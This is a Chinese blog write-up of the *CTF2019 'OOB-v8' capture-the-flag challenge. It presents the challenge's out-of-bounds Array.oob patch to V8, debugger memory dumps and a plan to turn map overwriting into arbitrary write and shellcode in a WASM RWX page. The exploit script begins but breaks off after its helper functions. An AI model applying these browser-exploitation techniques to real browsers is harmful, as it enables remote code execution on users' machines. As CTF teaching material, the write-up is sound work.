@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="一道非常适合入门v8的题目，通过oob改写map从而达到Type Confusion。">
+<meta name="keywords" content="exploit,Browser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="*CTF2019 OOB-v8">
+<meta property="og:url" content="http://yoursite.com/2020/04/26/CTF2019-OOB-v8/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="一道非常适合入门v8的题目，通过oob改写map从而达到Type Confusion。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/04/26/CTF2019-OOB-v8/000.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/26/CTF2019-OOB-v8/001.png">
+<meta property="og:updated_time" content="2020-04-27T15:35:45.239Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="*CTF2019 OOB-v8">
+<meta name="twitter:description" content="一道非常适合入门v8的题目，通过oob改写map从而达到Type Confusion。">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/26/CTF2019-OOB-v8/000.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/04/26/CTF2019-OOB-v8/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>*CTF2019 OOB-v8 | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/CTF2019-OOB-v8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">*CTF2019 OOB-v8
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-04-26 20:53:41" itemprop="dateCreated datePublished" datetime="2020-04-26T20:53:41+08:00">2020-04-26</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-04-27 23:35:45" itemprop="dateModified" datetime="2020-04-27T23:35:45+08:00">2020-04-27</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/" itemprop="url" rel="index"><span itemprop="name">Browser</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/v8/" itemprop="url" rel="index"><span itemprop="name">v8</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一道非常适合入门v8的题目，通过oob改写map从而达到Type Confusion。</p>
+<a id="more"></a>
+<hr>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
+gclient sync
+git apply ../Chrome/oob.diff
+./tools/dev/v8gen.py x64.release 
+ninja -C ./out.gn/x64.release d8
+./tools/dev/v8gen.py x64.debug 
+ninja -C ./out.gn/x64.debug d8
+</code></pre><p>包含oob.diff的文件可以在<a href="https://github.com/Changochen/CTF/tree/master/2019/*ctf" target="_blank" rel="noopener">这里</a>下载到。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Patch分析"><a href="#Patch分析" class="headerlink" title="Patch分析"></a>Patch分析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f <span class="number">100644</span></span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ <span class="number">-1668</span>,<span class="number">6</span> +<span class="number">1668</span>,<span class="number">8</span> @@ <span class="keyword">void</span> Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"fill"</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">"oob"</span>,</span><br><span class="line">+                          Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"find"</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"findIndex"</span>,</span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT <span class="built_in">Object</span> GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, <span class="attr">Object</span>::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);<span class="comment">//获得Array</span></span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());<span class="comment">//获得Array的elements</span></span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;<span class="built_in">Number</span>());<span class="comment">//获得元素长度</span></span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));<span class="comment">//read(arr[length])</span></span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;<span class="built_in">Object</span>&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, <span class="attr">Object</span>::ToNumber(isolate, args.at&lt;<span class="built_in">Object</span>&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.set(length,value-&gt;<span class="built_in">Number</span>());<span class="comment">//write(value into arr[length])</span></span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index <span class="number">0447230.</span>.f113a81 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ <span class="number">-368</span>,<span class="number">6</span> +<span class="number">368</span>,<span class="number">7</span> @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, <span class="attr">SharedFunctionInfo</span>::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, <span class="attr">SharedFunctionInfo</span>::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span><br><span class="line">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1680</span>,<span class="number">6</span> +<span class="number">1680</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       <span class="keyword">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span><br><span class="line">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayOob:</span><br><span class="line">+      <span class="keyword">return</span> Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// ArrayBuffer functions.</span></span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
+<p>可以看到Patch给Array对象添加了一个oob方法。具体实现在builtins-array.cc中。<br>我们可以很容易的看出来发生了越界访问。</p>
+<h2 id="elements后面是什么"><a href="#elements后面是什么" class="headerlink" title="elements后面是什么"></a>elements后面是什么</h2><p>上面产生的越界访问的是紧跟在最后一个element后面的，所以我们要了解elements后面跟的是什么。<br>进d8测试一下，我们输入：</p>
+<pre><code>d8&gt; var a = [1.1,1.2,1.3]
+d8&gt; %DebugPrint(a)
+</code></pre><p>可以看到布局</p>
+<pre><code>pwndbg&gt; job 0x30550308dd91
+0x30550308dd91: [JSArray]
+ - map: 0x39f350142ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x2cdec6cd1111 &lt;JSArray[0]&gt;
+ - elements: 0x30550308dd69 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: 3
+ - properties: 0x26783ca40c71 &lt;FixedArray[0]&gt; {
+    #length: 0x0ed7075801a9 &lt;AccessorInfo&gt; (const accessor descriptor)
+ }
+ - elements: 0x30550308dd69 &lt;FixedDoubleArray[3]&gt; {
+           0: 1.1
+           1: 1.2
+           2: 1.3
+ }
+pwndbg&gt; x/12gx 0x30550308dd69-1
+0x30550308dd68:    0x000026783ca414f9    0x0000000300000000
+0x30550308dd78:    0x3ff199999999999a    0x3ff3333333333333
+0x30550308dd88:    0x3ff4cccccccccccd    0x000039f350142ed9
+0x30550308dd98:    0x000026783ca40c71    0x000030550308dd69
+0x30550308dda8:    0x0000000300000000    0x000026783ca40941
+0x30550308ddb8:    0x00000adcba16a5aa    0x6974636e7566280a
+</code></pre><p>elements是在JSArray的map前并且相邻的。<br>所以布局应该如下图所示(抄Hpasserby师傅的图)</p>
+<pre><code>Elements---&gt;+-------------+
+            |  MAP        +&lt;------+
+            +-------------+       |
+            |  Length     |       |
+            +-------------+       |
+            |  element#1  |       |
+            +-------------+       |
+            |  element#2  |       |
+            +-------------+       |
+            |     ...     |       |
+            +-------------+       |
+            |  element#N  |       |
+ JSArray---&gt;--------------+       |
+            |  MAP        |       |
+            +-------------+       |
+            |  Properties |       |
+            +-------------+       |
+            |  Elements   +-------+
+            +-------------+
+            |  Length     |
+            +-------------+
+            |     ...     |
+            +-------------+
+</code></pre><p>在别人的文章里提到，并不是所有时候Elements紧紧邻着JSArray。<br>而通过splice(0)可以使其相邻。(发现slice(0)好像也可以)</p>
+<pre><code>d8&gt; var a = [1.1,1.2,1.3].splice(0)
+d8&gt; var b = [1.1,1.2,1.3].slice(0)
+</code></pre><h2 id="Type-Confusion"><a href="#Type-Confusion" class="headerlink" title="Type Confusion"></a>Type Confusion</h2><p>v8中对象的map描述对象的结构，如果能够修改map，那么就可以以新的map的类型取解析原本的对象数据。<br>例如，有一个存放对象的Array，有一个存放浮点数的Array，如果可以修改存放对象的Array的map为存放浮点数的Array的map，则可以把其中的对象(地址)当成浮点数读出来。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>总的来说是要往WASM的RWX区域写入shellcode。<br>所以我们要获得任意地址写的能力。</p>
+<ul>
+<li>首先创建一个fake_arraybuffer，并在其elements的一段伪造一个fake_map。</li>
+<li>创建一个浮点数数组和一个存储对象的数组(浮点数数组用于提取其map并赋值给对象数组的map以泄露对象地址)。</li>
+<li>通过oob方法泄露double_map和obj_map，并把obj_map覆盖为double_map。</li>
+<li>从obj中读出fake_arraybuffer的地址，并计算出其elements的地址和伪造的fake_map的地址。</li>
+<li>将elements地址写入obj数组，相当于写入了一个ArrayBuffer，还原obj的map为obj_map。</li>
+<li>通过DataView取出fake_arraybuffer，由于fake_arraybuffer是伪造的，可以随意修改backingstore区域。</li>
+<li>把RWX地址的存放地址放入fake_arraybuffer[4]，getFloat64读取，其值便为RWX地址。</li>
+<li>把RWX地址写入fake_arraybuffer[4]，再往DataView生成的fake_obj里面写shellcode就行。</li>
+</ul>
+<h2 id="WASM中RWX地址"><a href="#WASM中RWX地址" class="headerlink" title="WASM中RWX地址"></a>WASM中RWX地址</h2><p>试了几次v8的调试，该RWX地址通常与wasmInstance有固定的偏移。<br>WASM部分相关代码可以在<a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">这里</a>找到。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">readline();</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<pre><code>pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+     0x377c7238000      0x377c7240000 rw-p     8000 0      
+     0xb0459440000      0xb0459480000 rw-p    40000 0      
+     0xc6f0f0fc000      0xc6f0f0fd000 rwxp     1000 0 
+</code></pre><p>通过vmmap查出一片可执行区域。</p>
+<pre><code>pwndbg&gt; search -8 0xc6f0f0fc000
+                0x139a76e1f930 0xc6f0f0fc000
+[heap]          0x5575a45c9fe0 0xc6f0f0fc000
+[heap]          0x5575a45d72a8 0xc6f0f0fc000
+[heap]          0x5575a45d7300 0xc6f0f0fc000
+[heap]          0x5575a45d7450 0xc6f0f0fc000
+</code></pre><p>查看一下0x139a76e1f930</p>
+<pre><code>pwndbg&gt; p/x 0x139a76e1f930- 0x139a76e1f8a8
+$1 = 0x88
+</code></pre><p>发现该区域距离wasmInstance有0x88的偏移。</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>懒得写就抄<a href="https://hpasserby.top/post/825d66e8.html" target="_blank" rel="noopener">作业</a>了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span 